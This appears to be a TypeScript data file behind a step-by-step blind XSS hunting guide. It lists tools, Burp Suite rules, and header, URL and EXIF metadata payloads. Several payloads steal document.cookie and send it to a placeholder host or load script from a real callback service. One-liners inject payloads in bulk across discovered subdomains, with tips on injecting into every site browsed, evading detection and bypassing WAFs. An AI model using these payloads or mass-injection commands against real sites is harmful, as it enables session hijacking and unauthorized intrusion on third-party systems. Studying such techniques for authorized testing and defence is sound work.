export interface BlindXSSStep {
  id: string
  title: string
  description: string
  commands: { command: string; description: string }[]
  tools?: { name: string; url: string; description: string }[]
  tips?: string[]
}

export const blindXSSSteps: BlindXSSStep[] = [
  {
    id: "introduction",
    title: "Introduction",
    description:
      "Blind XSS (BXSS) is a stealthy form of cross-site scripting where payloads are stored in places you can't see immediately, such as logs, admin panels, email templates, file metadata and other backend systems, and only execute later when those systems render the data. Because there's no instant feedback, it requires specialized tools and techniques.",
    commands: [],
    tips: [
      "Blind XSS payloads execute in contexts you can't see - admin panels, logs, email systems",
      "You need an external server to receive callbacks when payloads fire",
      "Patience is key - payloads may take hours, days, or weeks to execute",
      "Always use your own controlled server for testing",
    ],
  },
  {
    id: "prerequisites",
    title: "Prerequisites & Tools",
    description:
      "Before hunting for Blind XSS, you need the right toolset configured and ready.",
    commands: [],
    tools: [
      {
        name: "XSS Hunter Express",
        url: "https://github.com/mandatoryprogrammer/xsshunter-express",
        description: "Self-hosted Blind XSS receiver/dashboard (OOB server)",
      },
      {
        name: "XSS Report",
        url: "https://xss.report/dashboard",
        description: "Public Blind XSS service for convenience",
      },
      {
        name: "Blind XSS Manager",
        url: "https://github.com/SeifElsallamy/Blind-XSS-Manager",
        description: "Browser extension for payload injection and tracking",
      },
      {
        name: "User-Agent Switcher",
        url: "https://chromewebstore.google.com/detail/user-agent-switcher-and-m/bhchdcejhohfmigjafbampogmaanbfkg",
        description: "Browser extension for quick header injections",
      },
    ],
    tips: [
      "Configure your Blind XSS Manager extension with your server address",
      "Use Burp Suite for Match & Replace rules and request inspection",
      "Arjun helps discover hidden parameters for bulk testing",
    ],
  },
  {
    id: "custom-dorks",
    title: "Step 1: Finding Targets with Custom Dorks",
    description:
      "The first step in any hunt is finding the right targets. Use custom dorks to locate various submission forms across the web that may be vulnerable to Blind XSS.",
    commands: [],
    tools: [
      {
        name: "BlindXSS Dorker",
        url: "https://adce626.github.io/BlindXSS-Dorker-adce626",
        description: "Pre-configured search queries to locate submission forms",
      },
    ],
    tips: [
      "Focus on contact forms, feedback forms, and support ticket systems",
      "Admin panels and logging systems are prime targets",
      "Look for applications that store user input for later review",
    ],
  },
  {
    id: "server-setup",
    title: "Step 2: Configure Blind XSS Server",
    description:
      "Before injecting payloads, you need a system to generate them and listen for their callbacks. This involves a Blind XSS server and a payload manager.",
    commands: [],
    tools: [
      {
        name: "XSS Hunter Express",
        url: "https://github.com/mandatoryprogrammer/xsshunter-express",
        description: "Self-hosted solution for full control",
      },
      {
        name: "XSS Report",
        url: "https://xss.report/dashboard",
        description: "Public ready-to-use service",
      },
      {
        name: "Blind XSS Manager Extension",
        url: "https://github.com/SeifElsallamy/Blind-XSS-Manager",
        description: "Browser extension to streamline injections",
      },
    ],
    tips: [
      "For sensitive testing, use a self-hosted solution you control",
      "Public services are convenient but may log your activity",
      "The extension helps manage multiple payloads across targets",
    ],
  },
  {
    id: "burp-automation",
    title: "Step 3: Automating with Burp Suite",
    description:
      "Use Burp Suite's Match and Replace feature to automatically inject Blind XSS payloads into every request you make.",
    commands: [
      {
        command: "Navigate to Proxy > Settings > Match and Replace",
        description: "Open Burp Suite Match & Replace settings",
      },
      {
        command: "Click 'Add' to create a new rule",
        description: "Add new replacement rule",
      },
      {
        command: "Set rule to replace User-Agent with your payload",
        description: "Configure header replacement",
      },
    ],
    tips: [
      "User-Agent header is commonly logged by backend systems",
      "Apply the same logic to Referer, Origin, Cookie, Accept, Host, X-Forwarded-For headers",
      "Custom headers like X-Api-Version are often rendered without sanitization",
    ],
  },
  {
    id: "header-payloads",
    title: "Header Injection Payloads",
    description:
      "These are example HTTP request headers with Blind XSS payloads. Replace YOUR-COLLAB.DOMAIN with your actual callback server.",
    commands: [
      {
        command: 'User-Agent: <script src="https://YOUR-COLLAB.DOMAIN"></script>',
        description: "Basic script injection in User-Agent",
      },
      {
        command: "Referer: https://YOUR-COLLAB.DOMAIN/?r=ref",
        description: "Callback via Referer header",
      },
      {
        command: "X-Forwarded-For: 127.0.0.1, https://YOUR-COLLAB.DOMAIN/",
        description: "X-Forwarded-For injection",
      },
      {
        command:
          "X-Api-Version: <svg onload=\"new Image().src='https://YOUR-COLLAB.DOMAIN/?c='+document.cookie\"></svg>",
        description: "SVG payload with cookie exfiltration",
      },
      {
        command:
          "Cookie: session=abc; extra=<img src=x onerror=\"new Image().src='https://YOUR-COLLAB.DOMAIN/?c='+document.cookie\">",
        description: "Cookie header injection",
      },
    ],
    tips: [
      "Test multiple headers - you never know which one gets rendered",
      "Some applications log all headers for debugging purposes",
      "X-Api-Version and similar custom headers are often overlooked",
    ],
  },
  {
    id: "browser-approach",
    title: "Step 4: Browser-Based User-Agent Switcher",
    description:
      "For manual testing, use a User-Agent switcher browser extension to quickly inject payloads while browsing.",
    commands: [],
    tools: [
      {
        name: "User-Agent Switcher and Manager",
        url: "https://chromewebstore.google.com/detail/user-agent-switcher-and-m/bhchdcejhohfmigjafbampogmaanbfkg",
        description: "Chrome extension for quick header modifications",
      },
    ],
    tips: [
      "Set your User-Agent to a payload and browse normally",
      "Every page you visit will have your payload in its logs",
      "Useful for passive hunting while doing other tasks",
    ],
  },
  {
    id: "automation-scripts",
    title: "Step 5: Scaling with Automation Scripts",
    description:
      "Use one-liner tools and scripts to scale your Blind XSS testing across many targets automatically.",
    commands: [
      {
        command:
          "arjun -u https://site.com/endpoint.php -oT arjun_output.txt -t 10 --rate-limit 10 --passive -m GET,POST --headers \"User-Agent: Mozilla/5.0\"",
        description: "Arjun: Discover hidden parameters (passive mode)",
      },
      {
        command:
          "arjun -u https://site.com/endpoint.php -oT arjun_output.txt -m GET,POST -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -t 10 --rate-limit 10 --headers \"User-Agent: Mozilla/5.0\"",
        description: "Arjun: Parameter discovery with custom wordlist",
      },
      {
        command:
          "subfinder -d vulnweb.com | gau | grep \"&\" | bxss -appendMode -payload '\"><script src=https://xss.report/c/coffinxp></script>' -parameters",
        description: "BXSS One-Liner: Inject into URL parameters",
      },
      {
        command:
          "subfinder -d vulnweb.com | gau | bxss -payload '\"><script src=https://xss.report/c/coffinxp></script>' -header \"X-Forwarded-For\"",
        description: "BXSS One-Liner: Inject into headers",
      },
    ],
    tips: [
      "Subfinder + GAU combination finds lots of endpoints quickly",
      "BXSS tool handles payload injection at scale",
      "Use rate limiting to avoid detection and blocking",
    ],
  },
  {
    id: "exif-payloads",
    title: "Step 6: Hiding Payloads in Image EXIF Data",
    description:
      "A clever technique is embedding XSS payloads in image metadata. When the application displays the metadata, your payload executes.",
    commands: [
      {
        command: "exiftool -Comment='\"><img src=x onerror=alert(1)>' test.jpg",
        description: "Inject XSS payload into image Comment field",
      },
      {
        command: "exiftool -Title='\"><script src=https://YOUR-COLLAB.DOMAIN></script>' test.jpg",
        description: "Inject payload into Title field",
      },
      {
        command: "exiftool -Subject='\"><svg onload=alert(1)>' test.jpg",
        description: "Inject payload into Subject field",
      },
    ],
    tools: [
      {
        name: "Image EXIF Data Tool",
        url: "https://github.com/coffinxp/Image-EXIF-Data",
        description: "Tool for managing EXIF payload injections",
      },
    ],
    tips: [
      "Windows: Right-click > Properties > Details to edit metadata",
      "Target fields: Title, Subject, Comments, Author, Tags",
      "Upload modified images to target applications",
      "Works when apps display image metadata without sanitization",
    ],
  },
  {
    id: "advanced-payloads",
    title: "Step 7: Advanced Payload Arsenal",
    description:
      "For highly-secured targets with strong input filtering, use encoded payloads. Create a single HTML file with dozens of payloads, each encoded differently (double URL encoding, triple URL encoding, HTML entities, etc.).",
    commands: [
      {
        command: '"><script src=https://YOUR-COLLAB.DOMAIN></script>',
        description: "Basic script tag payload",
      },
      {
        command: "'\"><img src=x onerror=this.src='https://YOUR-COLLAB.DOMAIN/?c='+document.cookie>",
        description: "Image error handler with cookie exfiltration",
      },
      {
        command:
          "<svg/onload=\"fetch('https://YOUR-COLLAB.DOMAIN/?c='+document.cookie)\">",
        description: "SVG with fetch API",
      },
      {
        command: "javascript:eval(atob('BASE64_ENCODED_PAYLOAD'))",
        description: "Base64 encoded payload",
      },
      {
        command: "%22%3E%3Cscript%20src%3Dhttps%3A%2F%2FYOUR-COLLAB.DOMAIN%3E%3C%2Fscript%3E",
        description: "URL encoded payload",
      },
      {
        command:
          "%25%32%32%25%33%45%25%33%43%73%63%72%69%70%74...",
        description: "Double URL encoded payload",
      },
    ],
    tips: [
      "Test multiple encoding variations against WAFs",
      "Maintain a payload file with various bypass techniques",
      "Different contexts require different encodings",
      "HTML entity encoding, Unicode, and mixed case can bypass filters",
    ],
  },
]
